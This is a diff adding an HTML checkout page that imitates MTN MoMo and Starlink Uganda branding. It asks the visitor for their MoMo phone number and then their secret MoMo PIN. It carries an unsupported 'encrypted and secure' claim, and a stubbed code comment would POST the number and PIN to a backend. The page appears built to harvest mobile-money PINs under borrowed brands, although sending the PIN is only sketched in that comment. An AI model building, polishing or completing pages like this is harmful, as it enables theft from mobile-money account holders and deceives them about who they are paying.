@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo - Secure Payment | Starlink Uganda</title>
+    <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <style>
+        /* ============================================
+           RESET & BASE
+        ============================================ */
+        *, *::before, *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --black: #000000;
+            --white: #ffffff;
+            --gray-50: #f9fafb;
+            --gray-100: #f3f4f6;
+            --gray-200: #e5e7eb;
+            --gray-300: #d1d5db;
+            --gray-400: #9ca3af;
+            --gray-500: #6b7280;
+            --gray-600: #4b5563;
+            --gray-700: #374151;
+            --gray-800: #1f2937;
+            --gray-900: #111827;
+            --blue-400: #60a5fa;
+            --blue-500: #3b82f6;
+            --blue-600: #2563eb;
+            --green-500: #22c55e;
+            --green-600: #16a34a;
+            --momo-yellow: #FFCC00;
+            --momo-yellow-dark: #E6B800;
+            --orange-500: #f97316;
+            --orange-600: #ea580c;
+            --radius-sm: 10px;
+            --radius-md: 16px;
+            --radius-lg: 22px;
+            --radius-xl: 26px;
+            --radius-2xl: 30px;
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.06), 0 1px 2px rgba(0,0,0,0.04);
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.08);
+            --shadow-lg: 0 8px 20px rgba(0,0,0,0.12);
+            --shadow-xl: 0 12px 28px rgba(0,0,0,0.16);
+            --shadow-2xl: 0 20px 40px rgba(0,0,0,0.2);
+            --header-h: 74px;
+            --footer-h: 68px;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: var(--gray-50);
+            color: var(--gray-900);
+            line-height: 1.5;
+            padding-top: var(--header-h);
+            padding-bottom: var(--footer-h);
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        body.modal-open {
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+            touch-action: none;
+        }
+
+        a { text-decoration: none; color: inherit; }
+        button { font-family: inherit; cursor: pointer; border: none; background: none; }
+
+        /* ============================================
+           HEADER
+        ============================================ */
+        .header {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            height: var(--header-h);
+            background-color: var(--black);
+            color: var(--white);
+            z-index: 100;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.4);
+        }
+
+        .header-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            height: 100%;
+            padding: 0 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .brand { display: flex; align-items: center; gap: 10px; }
+        .brand-logo { display: flex; align-items: center; gap: 8px; }
+        .brand-logo svg { width: 34px; height: 34px; }
+        .brand-name { font-size: 20px; font-weight: 800; letter-spacing: 4px; color: var(--white); }
+        .brand-divider { width: 1px; height: 26px; background: rgba(255,255,255,0.2); margin: 0 4px; }
+        .brand-sub { font-size: 12px; color: var(--gray-400); font-weight: 500; letter-spacing: 0.5px; }
+
+        .header-nav { display: none; gap: 26px; }
+        .header-nav a {
+            color: var(--gray-300);
+            font-size: 14px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 7px;
+            transition: color 0.2s;
+        }
+        .header-nav a:hover { color: var(--white); }
+        .header-nav i { font-size: 18px; }
+
+        /* ============================================
+           MAIN
+        ============================================ */
+        .main {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 22px 16px 36px;
+        }
+
+        .checkout-wrap {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: calc(100vh - 160px);
+            padding: 8px 0;
+        }
+
+        .checkout-card-wrap {
+            width: 100%;
+            max-width: 440px;
+        }
+
+        /* ============================================
+           MOMO LOGO HEADER BAND
+        ============================================ */
+        .momo-band {
+            background: linear-gradient(135deg, #FFCC00 0%, #FFD633 100%);
+            border-radius: var(--radius-2xl) var(--radius-2xl) 0 0;
+            padding: 30px 24px;
+            text-align: center;
+            box-shadow: var(--shadow-md);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .momo-band::before {
+            content: "";
+            position: absolute;
+            top: -40px; right: -40px;
+            width: 140px; height: 140px;
+            background: radial-gradient(circle, rgba(255,255,255,0.4), transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+
+        .momo-logo {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: var(--black);
+            color: var(--momo-yellow);
+            font-weight: 900;
+            font-size: 18px;
+            padding: 10px 20px;
+            border-radius: 12px;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.25);
+            position: relative;
+        }
+
+        .momo-logo i { font-size: 20px; }
+
+        .momo-tagline {
+            font-size: 12px;
+            font-weight: 700;
+            color: #7A5A00;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            margin-top: 14px;
+            position: relative;
+        }
+
+        /* ============================================
+           WHITE CARD BODY
+        ============================================ */
+        .checkout-body {
+            background: var(--white);
+            border-radius: 0 0 var(--radius-2xl) var(--radius-2xl);
+            padding: 26px 22px 28px;
+            box-shadow: var(--shadow-lg);
+        }
+
+        /* Amount block */
+        .amount-block {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--gray-200);
+            gap: 12px;
+        }
+
+        .amount-label {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--gray-400);
+            font-weight: 800;
+            margin-bottom: 6px;
+        }
+
+        .amount-value {
+            font-size: 30px;
+            font-weight: 900;
+            letter-spacing: -1px;
+            color: var(--gray-900);
+        }
+
+        .amount-plan {
+            text-align: right;
+        }
+
+        .amount-plan-name {
+            font-size: 14px;
+            font-weight: 900;
+            color: var(--gray-900);
+        }
+
+        .amount-plan-data {
+            font-size: 11.5px;
+            color: var(--blue-600);
+            font-weight: 800;
+            background: rgba(37,99,235,0.1);
+            padding: 3px 9px;
+            border-radius: 999px;
+            display: inline-block;
+            margin-top: 4px;
+        }
+
+        /* Instruction text */
+        .instruction {
+            text-align: center;
+            font-size: 14px;
+            color: var(--gray-600);
+            margin: 20px 0 22px;
+            font-weight: 500;
+        }
+
+        /* Form */
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 800;
+            color: var(--gray-900);
+            margin-bottom: 10px;
+        }
+
+        .phone-input-group {
+            display: flex;
+            border: 2px solid var(--gray-300);
+            border-radius: var(--radius-md);
+            overflow: hidden;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .phone-input-group:focus-within {
+            border-color: var(--momo-yellow-dark);
+            box-shadow: 0 0 0 4px rgba(255,204,0,0.18);
+        }
+
+        .phone-prefix {
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            background: var(--gray-50);
+            border-right: 2px solid var(--gray-300);
+            flex-shrink: 0;
+        }
+
+        .phone-prefix img {
+            width: 20px;
+            height: 14px;
+            margin-right: 10px;
+            border-radius: 2px;
+        }
+
+        .phone-prefix span {
+            font-weight: 800;
+            color: var(--gray-700);
+            font-size: 14px;
+        }
+
+        .phone-input {
+            flex: 1;
+            padding: 14px 16px;
+            border: none;
+            outline: none;
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--gray-900);
+            font-family: inherit;
+            background: var(--white);
+            min-width: 0;
+        }
+
+        .phone-input::placeholder {
+            color: var(--gray-400);
+            font-weight: 500;
+        }
+
+        /* Confirm button */
+        .btn-confirm {
+            width: 100%;
+            margin-top: 22px;
+            padding: 17px;
+            border-radius: var(--radius-md);
+            background: var(--momo-yellow);
+            color: var(--black);
+            font-weight: 900;
+            font-size: 15px;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 9px;
+            transition: transform 0.15s, filter 0.2s, box-shadow 0.25s;
+            box-shadow: 0 6px 18px rgba(255,204,0,0.4);
+        }
+
+        .btn-confirm:hover {
+            filter: brightness(0.96);
+            box-shadow: 0 8px 24px rgba(255,204,0,0.55);
+        }
+
+        .btn-confirm:active { transform: scale(0.98); }
+        .btn-confirm i { font-size: 19px; }
+
+        /* Security note */
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 7px;
+            font-size: 11.5px;
+            color: var(--gray-500);
+            margin-top: 18px;
+            font-weight: 500;
+        }
+
+        .security-note i {
+            color: var(--green-600);
+            font-size: 15px;
+        }
+
+        /* ============================================
+           PIN MODAL
+        ============================================ */
+        .modal-container {
+            position: fixed;
+            inset: 0;
+            z-index: 9999;
+            display: none;
+        }
+
+        .modal-container.open { display: block; }
+
+        .sheet-overlay {
+            position: absolute;
+            inset: 0;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(3px);
+            animation: fadeIn 0.2s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to   { opacity: 1; }
+        }
+
+        .pin-modal {
+            position: fixed;
+            left: 50%;
+            transform: translateX(-50%) translateY(20px);
+            bottom: 170px;
+            background: var(--white);
+            width: calc(100% - 32px);
+            max-width: 400px;
+            border-radius: var(--radius-xl);
+            padding: 24px 22px;
+            box-shadow: var(--shadow-2xl);
+            opacity: 0;
+            transition: opacity 0.25s ease, transform 0.25s ease, bottom 0.25s ease;
+            z-index: 1;
+        }
+
+        .pin-modal.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .pin-modal-title {
+            font-size: 18px;
+            color: var(--black);
+            margin-bottom: 14px;
+            line-height: 1.45;
+            font-weight: 600;
+        }
+
+        .pin-modal-title strong {
+            font-weight: 900;
+            color: var(--orange-600);
+        }
+
+        .pin-modal-sub {
+            font-size: 13.5px;
+            color: var(--gray-600);
+            margin-bottom: 20px;
+            line-height: 1.55;
+        }
+
+        .pin-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 800;
+            color: var(--gray-700);
+            margin-bottom: 8px;
+        }
+
+        .pin-input {
+            width: 100%;
+            padding: 14px 16px;
+            background: var(--white);
+            color: var(--black);
+            font-size: 24px;
+            outline: none;
+            border: 2px solid var(--gray-300);
+            border-radius: var(--radius-md);
+            letter-spacing: 12px;
+            text-align: center;
+            font-weight: 800;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            font-family: inherit;
+        }
+
+        .pin-input::placeholder {
+            color: var(--gray-300);
+            letter-spacing: 8px;
+            font-weight: 500;
+        }
+
+        .pin-input:focus {
+            border-color: var(--orange-500);
+            box-shadow: 0 0 0 4px rgba(249,115,22,0.15);
+        }
+
+        .pin-actions {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-top: 24px;
+        }
+
+        .btn-cancel {
+            padding: 14px;
+            font-weight: 800;
+            font-size: 14px;
+            color: var(--black);
+            background: var(--white);
+            border: 2px solid var(--gray-300);
+            border-radius: var(--radius-md);
+            transition: background 0.2s;
+        }
+
+        .btn-cancel:hover { background: var(--gray-100); }
+
+        .btn-pin-confirm {
+            padding: 14px;
+            font-weight: 900;
+            font-size: 14px;
+            color: var(--black);
+            background: var(--momo-yellow);
+            border-radius: var(--radius-md);
+            transition: filter 0.2s, transform 0.15s, opacity 0.2s;
+        }
+
+        .btn-pin-confirm:hover:not(:disabled) { filter: brightness(0.95); }
+        .btn-pin-confirm:active:not(:disabled) { transform: scale(0.97); }
+        .btn-pin-confirm:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+
+        /* ============================================
+           BOTTOM NAV
+        ============================================ */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0; left: 0; right: 0;
+            height: var(--footer-h);
+            background: var(--white);
+            border-top: 1px solid var(--gray-200);
+            box-shadow: 0 -4px 20px rgba(0,0,0,0.08);
+            z-index: 100;
+        }
+
+        .bottom-nav-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            height: 100%;
+            padding: 0 12px;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            color: var(--gray-600);
+            font-size: 11px;
+            font-weight: 700;
+            transition: color 0.2s, transform 0.2s;
+            padding: 6px 14px;
+            border-radius: 12px;
+        }
+
+        .nav-item i { font-size: 24px; }
+        .nav-item:hover { transform: translateY(-2px); }
+
+        /* ============================================
+           RESPONSIVE
+        ============================================ */
+        @media (min-width: 640px) {
+            .main { padding: 28px 22px 44px; }
+            .momo-band { padding: 36px 32px; }
+            .checkout-body { padding: 30px 28px 32px; }
+            .amount-value { font-size: 34px; }
+        }
+
+        @media (min-width: 768px) {
+            .header-nav { display: flex; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ============ HEADER ============ -->
+    <header class="header">
+        <div class="header-inner">
+            <a href="/" class="brand">
+                <div class="brand-logo">
+                    <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Starlink">
+                        <circle cx="32" cy="32" r="30" stroke="#ffffff" stroke-width="3" fill="none"/>
+                        <path d="M8 32c0-4 3-7 7-7h34c4 0 7 3 7 7s-3 7-7 7H15c-4 0-7-3-7-7z" fill="#ffffff"/>
+                        <circle cx="32" cy="32" r="6" fill="#000000"/>
+                        <circle cx="32" cy="32" r="3" fill="#2563eb"/>
+                    </svg>
+                    <span class="brand-name">STARLINK</span>
+                </div>
+                <div class="brand-divider"></div>
+                <span class="brand-sub">Uganda Reseller</span>
+            </a>
+
+            <nav class="header-nav">
+                <a href="/dashboard/">
+                    <i class="uil uil-wifi"></i> <span>Status</span>
+                </a>
+                <a href="/plans/">
+                    <i class="uil uil-home"></i> <span>Plans</span>
+                </a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- ============ MAIN ============ -->
+    <main class="main">
+        <div class="checkout-wrap">
+            <div class="checkout-card-wrap">
+
+                <!-- MoMo Band -->
+                <div class="momo-band">
+                    <div class="momo-logo">
+                        <i class="uil uil-mobile-android"></i>
+                        MTN MoMo
+                    </div>
+                    <p class="momo-tagline">Secure Payment</p>
+                </div>
+
+                <!-- White Card Body -->
+                <div class="checkout-body">
+
+                    <!-- Amount -->
+                    <div class="amount-block">
+                        <div>
+                            <p class="amount-label">Amount</p>
+                            <p class="amount-value" id="display-amount">UGX 3,500.00</p>
+                        </div>
+                        <div class="amount-plan">
+                            <p class="amount-plan-name" id="display-plan-name">Standard</p>
+                            <span class="amount-plan-data" id="display-plan-data">60GB</span>
+                        </div>
+                    </div>
+
+                    <p class="instruction">Enter your MTN MoMo details to authorize</p>
+
+                    <form id="paymentForm" method="POST" autocomplete="off" onsubmit="return false;">
+
+                        <label class="form-label" for="momo_number">MTN MoMo Number</label>
+
+                        <div class="phone-input-group">
+                            <div class="phone-prefix">
+                                <img src="https://flagcdn.com/w40/ug.png" alt="Uganda">
+                                <span>+256</span>
+                            </div>
+                            <input
+                                type="tel"
+                                id="momo_number"
+                                name="momo_number"
+                                required
+                                inputmode="numeric"
+                                autocomplete="off"
+                                placeholder="7xxxxxxx"
+                                class="phone-input"
+                            />
+                        </div>
+
+                        <button type="button" id="openPinModal" class="btn-confirm">
+                            <i class="uil uil-lock"></i>
+                            Confirm Payment
+                        </button>
+
+                    </form>
+
+                    <p class="security-note">
+                        <i class="uil uil-shield-check"></i>
+                        Your payment is encrypted and secure
+                    </p>
+
+                </div>
+
+            </div>
+        </div>
+    </main>
+
+    <!-- ============ PIN MODAL ============ -->
+    <div class="modal-container" id="modalContainer">
+        <div class="sheet-overlay" id="sheetOverlay"></div>
+
+        <div class="pin-modal" id="pinModal">
+            <h3 class="pin-modal-title">
+                Do you want to pay <strong id="confirmAmount">UGX 3,500.00</strong>?
+            </h3>
+
+            <p class="pin-modal-sub">Enter your MTN MoMo PIN to authorize this payment</p>
+
+            <label class="pin-label" for="momo_pin">Enter PIN</label>
+
+            <input
+                id="momo_pin"
+                type="password"
+                maxlength="5"
+                minlength="4"
+                inputmode="numeric"
+                autocomplete="off"
+                autocorrect="off"
+                autocapitalize="off"
+                spellcheck="false"
+                enterkeyhint="done"
+                placeholder="••••"
+                class="pin-input"
+            />
+
+            <div class="pin-actions">
+                <button id="cancelBtn" type="button" class="btn-cancel">Cancel</button>
+                <button id="confirmBtn" type="button" disabled class="btn-pin-confirm">Confirm</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============ BOTTOM NAV ============ -->
+    <nav class="bottom-nav">
+        <div class="bottom-nav-inner">
+            <a href="/dashboard/" class="nav-item">
+                <i class="uil uil-wifi"></i>
+                <span>Status</span>
+            </a>
+            <a href="/plans/" class="nav-item">
+                <i class="uil uil-shopping-bag"></i>
+                <span>Plans</span>
+            </a>
+            <a href="/settings/" class="nav-item">
+                <i class="uil uil-setting"></i>
+                <span>Settings</span>
+            </a>
+        </div>
+    </nav>
+
+    <!-- ============ SCRIPT ============ -->
+    <script>
+        // ============================================
+        // READ PLAN FROM URL
+        // ============================================
+        const params = new URLSearchParams(window.location.search);
+        const planName = params.get('plan') || 'Standard';
+        const planData = params.get('data') || '60GB';
+        const planPrice = parseInt(params.get('price') || '3500', 10);
+
+        const formattedPrice = 'UGX ' + planPrice.toLocaleString('en-UG', { minimumFractionDigits: 2 });
+
+        document.getElementById('display-plan-name').textContent = planName;
+        document.getElementById('display-plan-data').textContent = planData;
+        document.getElementById('display-amount').textContent = formattedPrice;
+        document.getElementById('confirmAmount').textContent = formattedPrice;
+
+        // ============================================
+        // ELEMENTS
+        // ============================================
+        const modal = document.getElementById('modalContainer');
+        const popup = document.getElementById('pinModal');
+        const pin = document.getElementById('momo_pin');
+        const openBtn = document.getElementById('openPinModal');
+        const number = document.getElementById('momo_number');
+        const confirm = document.getElementById('confirmBtn');
+        const cancel = document.getElementById('cancelBtn');
+        const overlay = document.getElementById('sheetOverlay');
+        const form = document.getElementById('paymentForm');
+
+        // ============================================
+        // KEYBOARD-AWARE POPUP POSITION
+        // ============================================
+        function movePopup() {
+            if (window.visualViewport) {
+                const keyboard = window.innerHeight - window.visualViewport.height;
+                popup.style.bottom = Math.max(170, keyboard + 70) + 'px';
+            }
+        }
+
+        if (window.visualViewport) {
+            window.visualViewport.addEventListener('resize', movePopup);
+        }
+
+        // ============================================
+        // OPEN / CLOSE MODAL
+        // ============================================
+        function openModal() {
+            document.body.classList.add('modal-open');
+            modal.classList.add('open');
+            movePopup();
+
+            setTimeout(() => {
+                popup.classList.add('show');
+                setTimeout(() => pin.focus(), 250);
+            }, 50);
+        }
+
+        function closeModal() {
+            popup.classList.remove('show');
+            setTimeout(() => {
+                modal.classList.remove('open');
+                pin.value = '';
+                confirm.disabled = true;
+                document.body.classList.remove('modal-open');
+            }, 250);
+        }
+
+        // ============================================
+        // OPEN — validate phone first
+        // ============================================
+        openBtn.addEventListener('click', () => {
+            const num = number.value.trim();
+
+            if (!num) {
+                number.reportValidity();
+                return;
+            }
+
+            // Accept 9 digits (no leading 0) OR 10 digits starting with 0
+            if (!(/^\d{9}$/.test(num) || /^0\d{9}$/.test(num))) {
+                number.setCustomValidity('Enter 9 digits (e.g. 7xxxxxxxx) or 10 digits starting with 0 (e.g. 07xxxxxxxx)');
+                number.reportValidity();
+                return;
+            }
+
+            number.setCustomValidity('');
+
+            if (!number.checkValidity()) {
+                number.reportValidity();
+                return;
+            }
+
+            openModal();
+        });
+
+        // ============================================
+        // PIN INPUT — only digits, enable when 4-5 digits
+        // ============================================
+        pin.addEventListener('input', function () {
+            this.value = this.value.replace(/\D/g, '');
+
+            const isValid = /^\d{4,5}$/.test(this.value);
+            confirm.disabled = !isValid;
+
+            // Auto-submit on 5-digit PIN
+            if (this.value.length === 5) {
+                setTimeout(() => {
+                    submitPayment();
+                }, 300);
+            }
+        });
+
+        // ============================================
+        // CONFIRM
+        // ============================================
+        confirm.addEventListener('click', () => {
+            if (!/^\d{4,5}$/.test(pin.value)) {
+                alert('Please enter a 4 or 5 digit PIN');
+                return;
+            }
+            submitPayment();
+        });
+
+        // ============================================
+        // SUBMIT PAYMENT
+        // Here's where you'd POST to your backend.
+        // For now, show a processing state then redirect.
+        // ============================================
+        function submitPayment() {
+            confirm.disabled = true;
+            confirm.textContent = 'Processing...';
+
+            // TODO: Replace this with your real API call:
+            /*
+            fetch('/api/momo/pay/', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    plan: planName,
+                    data: planData,
+                    price: planPrice,
+                    momo_number: number.value,
+                    pin: pin.value
+                })
+            })
+            .then(res => res.json())
+            .then(data => { ... })
+            */
+
+            // Simulated flow — for demo
+            setTimeout(() => {
+                const successParams = new URLSearchParams({
+                    plan: planName,
+                    data: planData,
+                    price: planPrice,
+                    phone: number.value
+                });
+                window.location.href = '/success/?' + successParams.toString();
+            }, 1800);
+        }
+
+        // ============================================
+        // CANCEL / OVERLAY
+        // ============================================
+        cancel.addEventListener('click', closeModal);
+        overlay.addEventListener('click', closeModal);
+    </script>
+</body>
+</html>
